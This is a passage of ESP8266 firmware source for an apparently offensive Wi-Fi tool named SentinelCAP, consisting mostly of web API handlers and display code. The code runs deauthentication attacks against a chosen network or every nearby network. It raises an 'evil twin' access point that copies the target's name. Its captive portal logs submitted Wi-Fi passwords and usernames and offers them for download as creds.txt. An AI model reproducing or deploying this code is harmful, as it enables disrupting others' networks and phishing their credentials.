    char bssidStr[MAX_BSSID_STR_LEN];
    formatBSSID(net->bssid, bssidStr);
    obj["bssid"] = bssidStr;
    
    obj["ch"] = net->ch;
    obj["rssi"] = net->rssi;
    obj["sec"] = net->security;
    obj["hidden"] = net->hidden;
  }
  
  char response[JSON_BUFFER_SIZE];
  size_t len = serializeJson(doc, response, JSON_BUFFER_SIZE);
  
  webServer.send(200, "application/json", response, len);
}

void handleApiSelect() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<256> doc;
  DeserializationError err = deserializeJson(doc, webServer.arg("plain"));
  
  if (err) {
    webServer.send(400, "application/json", "{\"e\":1}");
    return;
  }
  
  const char* bssidStr = doc["bssid"];
  uint8_t bssid[6];
  
  if (!parseBSSID(bssidStr, bssid)) {
    webServer.send(400, "application/json", "{\"e\":2}");
    return;
  }
  
  bool found = false;
  for (uint8_t i = 0; i < networkCount; i++) {
    if (memcmp(networkList[i].bssid, bssid, 6) == 0) {
      memcpy(&selectedNetwork, &networkList[i], sizeof(NetworkEntry));
      found = true;
      break;
    }
  }
  
  webServer.send(200, "application/json", found ? "{\"success\":true}" : "{\"success\":false}");
}

void handleApiToggleDeauth() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<256> doc;
  DeserializationError err = deserializeJson(doc, webServer.arg("plain"));
  
  bool targetAll = false;
  if (!err) targetAll = doc["target_all"] | false;
  
  if (targetAll) {
    if (deauthAllMode) {
      // Stop deauth all
      deauthActive = false;
      deauthAllMode = false;
    } else {
      if (hotspotActive) {
        webServer.send(400, "application/json", "{\"e\":\"stop twin first\"}");
        return;
      }
      deauthActive = true;
      deauthAllMode = true;
      deauthStartTime = millis();
      deauthPacketCount = 0;
      currentDeauthIndex = 0;
      performScan();
    }
  } else {
    // Single target
    if (selectedNetwork.ssid[0] == '\0' && !selectedNetwork.hidden) {
      webServer.send(400, "application/json", "{\"e\":\"select net first\"}");
      return;
    }
    if (hotspotActive) {
      webServer.send(400, "application/json", "{\"e\":\"stop twin first\"}");
      return;
    }
    if (deauthAllMode) {
      deauthActive = false;
      deauthAllMode = false;
    }
    
    deauthActive = !deauthActive;
    if (deauthActive) {
      deauthStartTime = millis();
      deauthPacketCount = 0;
    }
  }
  
  StaticJsonDocument<128> resp;
  resp["deauth_active"] = deauthActive;
  resp["deauth_all"] = deauthAllMode;
  
  char buf[128];
  serializeJson(resp, buf, sizeof(buf));
  webServer.send(200, "application/json", buf);
}

void handleApiToggleHotspot() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  if (selectedNetwork.ssid[0] == '\0' && !selectedNetwork.hidden) {
    webServer.send(400, "application/json", "{\"e\":\"select net first\"}");
    return;
  }
  if (deauthActive) {
    webServer.send(400, "application/json", "{\"e\":\"stop deauth first\"}");
    return;
  }
  
  hotspotActive = !hotspotActive;
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  if (hotspotActive) {
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(selectedNetwork.ssid[0] ? selectedNetwork.ssid : 
                (char*)selectedNetwork.bssid);  // Use BSSID if hidden
    dnsServer.start(DNS_PORT, "*", apIP);
    evilTwinStartTime = millis();
    memset(lastCapturedUser, 0, sizeof(lastCapturedUser));
    memset(lastCapturedPass, 0, sizeof(lastCapturedPass));
  } else {
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(settings.adminApSsid, settings.adminApPassword);
    dnsServer.start(DNS_PORT, "*", apIP);
  }
  
  StaticJsonDocument<64> doc;
  doc["active"] = hotspotActive;
  
  char buf[64];
  serializeJson(doc, buf, sizeof(buf));
  webServer.send(200, "application/json", buf);
}

void handleApiStatus() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<512> doc;
  
  doc["target"] = selectedNetwork.ssid[0] ? selectedNetwork.ssid : 
                  (selectedNetwork.hidden ? "(Hidden)" : "None");
  doc["twin"] = hotspotActive;
  doc["deauth"] = deauthActive;
  doc["deauth_all"] = deauthAllMode;
  doc["captured"] = logEntryCount;
  
  char bssidStr[MAX_BSSID_STR_LEN];
  formatBSSID(selectedNetwork.bssid, bssidStr);
  doc["bssid"] = bssidStr;
  doc["ch"] = selectedNetwork.ch;
  
  IPAddress ip = WiFi.softAPIP();
  char ipStr[16];
  snprintf(ipStr, sizeof(ipStr), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
  doc["ip"] = ipStr;
  
  uint32_t sec = (millis() - startTime) / 1000;
  doc["uptime"] = sec;
  doc["heap"] = ESP.getFreeHeap();
  
  char buf[512];
  serializeJson(doc, buf, sizeof(buf));
  webServer.send(200, "application/json", buf);
}

void handleApiLogs() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<LOG_BUFFER_SIZE + 64> doc;
  doc["count"] = logEntryCount;
  
  // Read circular buffer in order
  String logs;
  if (passwordLog[logWriteIndex] != '\0' && logWriteIndex < LOG_BUFFER_SIZE - 1) {
    // Has wrapped
    logs.concat(passwordLog + logWriteIndex);
    logs.concat(passwordLog, logWriteIndex);
  } else {
    logs.concat(passwordLog, logWriteIndex);
  }
  
  doc["logs"] = logs;
  
  char* buf = (char*)malloc(LOG_BUFFER_SIZE + 64);  // Temporary allocation
  if (buf) {
    size_t len = serializeJson(doc, buf, LOG_BUFFER_SIZE + 64);
    webServer.send(200, "application/json", buf, len);
    free(buf);
  } else {
    webServer.send(500, "application/json", "{\"e\":\"oom\"}");
  }
}

void handleApiClearLogs() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  memset(passwordLog, 0, LOG_BUFFER_SIZE);
  logWriteIndex = 0;
  logEntryCount = 0;
  savePasswordLog();
  
  webServer.send(200, "application/json", "{\"success\":true}");
}

void handleApiDownloadLogs() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  webServer.sendHeader("Content-Disposition", "attachment; filename=creds.txt");
  
  // Stream circular buffer
  if (passwordLog[logWriteIndex] != '\0' && logWriteIndex < LOG_BUFFER_SIZE - 1) {
    webServer.sendContent(passwordLog + logWriteIndex, LOG_BUFFER_SIZE - logWriteIndex);
  }
  webServer.sendContent(passwordLog, logWriteIndex);
  
  webServer.send(200, "text/plain", "");
}

void handleApiFiles() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<1024> doc;
  JsonArray arr = doc.to<JsonArray>();
  
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    JsonObject obj = arr.createNestedObject();
    obj["name"] = dir.fileName().c_str() + 1;  // Skip leading /
    obj["size"] = dir.fileSize();
  }
  
  char buf[1024];
  size_t len = serializeJson(doc, buf, sizeof(buf));
  webServer.send(200, "application/json", buf, len);
}

void handleApiDeselect() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  memset(&selectedNetwork, 0, sizeof(selectedNetwork));
  deauthActive = false;
  deauthAllMode = false;
  hotspotActive = false;
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(settings.adminApSsid, settings.adminApPassword);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.send(200, "application/json", "{\"success\":true}");
}

void handleApiGetSettings() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<512> doc;
  doc["apssid"] = settings.adminApSsid;
  doc["appass"] = settings.adminApPassword;
  doc["webuser"] = settings.webUser;
  doc["webpass"] = settings.webPass;
  doc["rate"] = settings.deauthRate;
  doc["oled"] = settings.oledMode;
  
  char buf[512];
  serializeJson(doc, buf, sizeof(buf));
  webServer.send(200, "application/json", buf);
}

void handleApiSaveSettings() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<512> doc;
  DeserializationError err = deserializeJson(doc, webServer.arg("plain"));
  
  if (err) {
    webServer.send(400, "application/json", "{\"e\":\"invalid json\"}");
    return;
  }
  
  bool apChanged = false;
  
  const char* newSsid = doc["adminApSsid"];
  const char* newPass = doc["adminApPassword"];
  
  if (newSsid && strcmp(newSsid, settings.adminApSsid) != 0) {
    strncpy(settings.adminApSsid, newSsid, MAX_SSID_LEN);
    apChanged = true;
  }
  if (newPass && strcmp(newPass, settings.adminApPassword) != 0) {
    strncpy(settings.adminApPassword, newPass, MAX_PASS_LEN);
    apChanged = true;
  }
  
  const char* newUser = doc["webAdminUsername"];
  const char* newWPass = doc["webAdminPassword"];
  if (newUser) strncpy(settings.webUser, newUser, 15);
  if (newWPass) strncpy(settings.webPass, newWPass, 15);
  
  settings.deauthRate = doc["deauthPacketRate"] | settings.deauthRate;
  if (settings.deauthRate < 1) settings.deauthRate = 1;
  if (settings.deauthRate > 20) settings.deauthRate = 20;
  deauthIntervalMs = 1000 / settings.deauthRate;
  
  settings.oledMode = doc["oledDisplayMode"] | settings.oledMode;
  if (settings.oledMode >= MODE_MAX) settings.oledMode = MODE_IDLE;
  
  saveSettings();
  
  if (apChanged) {
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAP(settings.adminApSsid, settings.adminApPassword);
    dnsServer.start(DNS_PORT, "*", apIP);
  }
  
  webServer.send(200, "application/json", "{\"success\":true}");
}

void handleApiSetOledMode() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<64> doc;
  DeserializationError err = deserializeJson(doc, webServer.arg("plain"));
  
  if (!err) {
    const char* mode = doc["mode"];
    if (mode && strcmp(mode, "cycle") == 0) {
      settings.oledMode = (settings.oledMode + 1) % MODE_MAX;
    } else {
      int m = doc["mode"] | settings.oledMode;
      if (m >= 0 && m < MODE_MAX) settings.oledMode = m;
    }
    saveSettings();
  }
  
  StaticJsonDocument<64> resp;
  resp["mode"] = settings.oledMode;
  
  char buf[64];
  serializeJson(resp, buf, sizeof(buf));
  webServer.send(200, "application/json", buf);
}

// --- CAPTIVE PORTAL ---
void handleCaptivePortal() {
  if (!hotspotActive) {
    webServer.sendHeader("Location", String("http://") + apIP.toString() + "/generate", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  
  // Stream template with replacement
  webServer.setContentLength(strlen_P(CAPTIVE_HTML) + 32);
  webServer.send(200, "text/html", "");
  
  const char* ptr = CAPTIVE_HTML;
  char buffer[128];
  
  while (strlen_P(ptr) > 0) {
    strncpy_P(buffer, ptr, 127);
    buffer[127] = '\0';
    
    // Simple replacement
    char* placeholder = strstr(buffer, "{SSID}");
    if (placeholder) {
      *placeholder = '\0';
      webServer.sendContent(buffer);
      webServer.sendContent(selectedNetwork.ssid[0] ? selectedNetwork.ssid : "WiFi");
      webServer.sendContent(placeholder + 6);
    } else {
      webServer.sendContent(buffer);
    }
    
    ptr += 127;
  }
}

void handleCaptiveSubmit() {
  if (!hotspotActive) {
    webServer.send(403);
    return;
  }
  
  const char* pass = webServer.arg("p").c_str();
  const char* user = webServer.hasArg("u") ? webServer.arg("u").c_str() : "N/A";
  
  if (strlen(pass) >= 4) {
    addToPasswordLog(selectedNetwork.ssid, user, pass);
    
    webServer.send(200, "text/html", 
      "<!DOCTYPE html><html><head><title>Connecting...</title>"
      "<meta http-equiv='refresh' content='3;url=http://example.com'>"
      "<style>body{font-family:sans-serif;text-align:center;padding:50px}</style>"
      "</head><body>"
      "<h1>Connecting...</h1>"
      "<p>Please wait while we establish connection.</p>"
      "</body></html>");
  } else {
    webServer.send(200, "text/html", 
      "<!DOCTYPE html><html><body>"
      "<script>alert('Invalid password');history.back();</script>"
      "</body></html>");
  }
}

// --- FILE UPLOAD ---
void handleFileUpload() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  HTTPUpload& upload = webServer.upload();
  
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    
    SPIFFS.remove(filename);
    File f = SPIFFS.open(filename, "w");
    if (!f) {
      webServer.send(500, "text/plain", "File open failed");
      return;
    }
    f.close();  // Will reopen for writing
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File f = SPIFFS.open(webServer.upload().filename, "a");
    if (f) {
      f.write(upload.buf, upload.currentSize);
      f.close();
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    webServer.send(200, "application/json", "{\"success\":true}");
  }
}

void handleFileDelete() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  
  StaticJsonDocument<256> doc;
  deserializeJson(doc, webServer.arg("plain"));
  
  const char* filename = doc["filename"];
  if (filename) {
    String path = "/";
    path += filename;
    if (SPIFFS.exists(path)) {
      SPIFFS.remove(path);
      webServer.send(200, "application/json", "{\"success\":true}");
      return;
    }
  }
  webServer.send(404, "application/json", "{\"success\":false}");
}

// --- OTA UPDATE ---
void handleOTAUpdate() {
  if (!isAuthenticated()) {
    webServer.send(401);
    return;
  }
  
  HTTPUpload& upload = webServer.upload();
  
  if (upload.status == UPLOAD_FILE_START) {
    #if ENABLE_SERIAL_DEBUG
    Serial.printf_P(PSTR("[OTA] Starting: %s\n"), upload.filename.c_str());
    #endif
    if (!Update.begin(upload.totalSize)) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) {
      #if ENABLE_SERIAL_DEBUG
      Serial.printf_P(PSTR("[OTA] Success: %u bytes\n"), upload.totalSize);
      #endif
      webServer.send(200, "text/plain", "OK");
      ESP.restart();
    } else {
      Update.printError(Serial);
      webServer.send(500, "text/plain", "FAIL");
    }
  }
}

void handleRestart() {
  if (!isAuthenticated()) return webServer.requestAuthentication();
  webServer.send(200, "text/html", "Restarting...");
  delay(1000);
  ESP.restart();
}

// --- OLED DISPLAY ---
void updateOLED() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header
  display.setCursor(0, 0);
  display.print(F("SentinelCAP "));
  display.print(FIRMWARE_VERSION);
  
  // Mode indicator
  const char* modeName = (const char*)pgm_read_ptr(&oledModeNames[settings.oledMode]);
  char modeBuf[8];
  strncpy_P(modeBuf, modeName, 7);
  modeBuf[7] = '\0';
  display.setCursor(128 - (strlen(modeBuf) * 6), 0);
  display.print(modeBuf);
  
  // Main content based on mode
  switch (settings.oledMode) {
    case MODE_IDLE:
      display.setCursor(0, 12);
      display.print(F("Status: "));
      if (deauthActive) {
        display.print(deauthAllMode ? F("DEAUTH ALL") : F("DEAUTH"));
      } else if (hotspotActive) {
        display.print(F("EVIL TWIN"));
      } else {
        display.print(F("IDLE"));
      }
      
      display.setCursor(0, 24);
      display.print(F("Target: "));
      if (deauthAllMode) {
        display.print(F("All Networks"));
      } else if (selectedNetwork.ssid[0]) {
        char ssid[13];
        strncpy(ssid, selectedNetwork.ssid, 12);
        ssid[12] = '\0';
        display.print(ssid);
      } else {
        display.print(F("None"));
      }
      
      display.setCursor(0, 36);
      display.print(F("Clients: "));
      display.print(WiFi.softAPgetStationNum());
      
      display.setCursor(0, 48);
      display.print(F("Heap: "));
      display.print(ESP.getFreeHeap() / 1024);
      display.print(F("k"));
      break;
      
    case MODE_ATTACK:
      display.setCursor(0, 12);
      display.print(F("DEAUTH: "));
      display.print(deauthActive ? F("ON") : F("OFF"));
      if (deauthActive) {
        display.setCursor(0, 24);
        display.print(F("Pkts: "));
        display.print(deauthPacketCount);
        display.print(F(" Rate:"));
        display.print(settings.deauthRate);
        
        if (deauthAllMode) {
          display.setCursor(0, 36);
          display.print(F("Idx: "));
          display.print(currentDeauthIndex + 1);
          display.print(F("/"));
          display.print(networkCount);
        } else {
          display.setCursor(0, 36);
          display.print(F("Ch:"));
          display.print(selectedNetwork.ch);
        }
      }
      
      display.setCursor(0, 48);
      display.print(F("Twin: "));
      display.print(hotspotActive ? F("ON ") : F("OFF"));
      if (hotspotActive) {
        uint32_t secs = (millis() - evilTwinStartTime) / 1000;
        display.print(secs);
        display.print(F("s"));
      }
      break;
      
    case MODE_SCAN:
      display.setCursor(0, 12);
      display.print(F("Networks: "));
      display.print(networkCount);
      
      for (int i = 0; i < 3 && i < networkCount; i++) {
        display.setCursor(0, 26 + (i * 12));
        NetworkEntry* net = &networkList[i];
        char ssid[11];
        strncpy(ssid, net->ssid[0] ? net->ssid : (char*)net->bssid, 10);
        ssid[10] = '\0';
        display.print(ssid);
        display.print(F(" "));
        display.print(net->rssi);
        display.print(F("dBm"));
      }
      break;
  }
  
  // Footer - Uptime
  display.setCursor(0, 56);
  uint32_t secs = (millis() - startTime) / 1000;
  uint32_t mins = secs / 60;
  uint32_t hrs = mins / 60;
  secs %= 60;
  mins %= 60;
  display.print(hrs);
  display.print(F("h"));
  display.print(mins);
  display.print(F("m"));
  display.print(secs);
  display.print(F("s"));
  
  display.display();
}

// --- UTILITY ---
void printP(const char* pstr) {
  char c;
  while ((c = pgm_read_byte(pstr++))) Serial.print(c);
}
